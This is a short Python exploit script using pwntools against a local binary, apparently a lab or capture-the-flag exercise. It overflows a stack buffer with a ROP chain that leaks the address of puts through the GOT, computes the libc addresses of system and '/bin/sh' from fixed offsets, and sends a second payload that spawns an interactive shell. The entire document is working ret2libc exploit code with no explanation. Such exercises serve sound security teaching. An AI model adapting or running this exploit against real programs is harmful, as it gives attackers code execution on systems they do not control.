#!/usr/bin/env python3

from pwn import *
target = process("./bin/ex1")

puts_plt_address = 0x401030

# 0x000000000040116f : pop rdi ; pop rbp ; ret
rop_gadget_address = 0x40116f

# objdump -R ./bin/ex1 | grep -i puts
puts_got_address = 0x404018

main_address = 0x401172

print(f" AM PRIMIT: {target.recvline()}")
print(f" AM PRIMIT: {target.recvline()}")

payload = 40 * b"Z"
payload += p64(rop_gadget_address, "little") + p64(puts_got_address, "little") + p64(0xc0fec0fe, "little") \
    + p64(puts_plt_address, "little") +  p64(main_address, "little")

target.sendline(payload)
puts_address = target.recvline()

leaked_puts_address = u64(puts_address.strip().ljust(8, b'\x00')) # Remove string termination

offset_between_puts_binsh = 1306017
offset_between_puts_system = 182864
system_address =  leaked_puts_address - offset_between_puts_system
bin_sh_address = offset_between_puts_binsh + leaked_puts_address
ret_gadget_address = 0x40101a

payload = 40 * b'Z'
payload += p64(rop_gadget_address, "little") + p64(bin_sh_address, "little") + p64(0xc0fec0fe, "little") + p64(system_address, "little")

target.sendline(payload)
target.interactive()

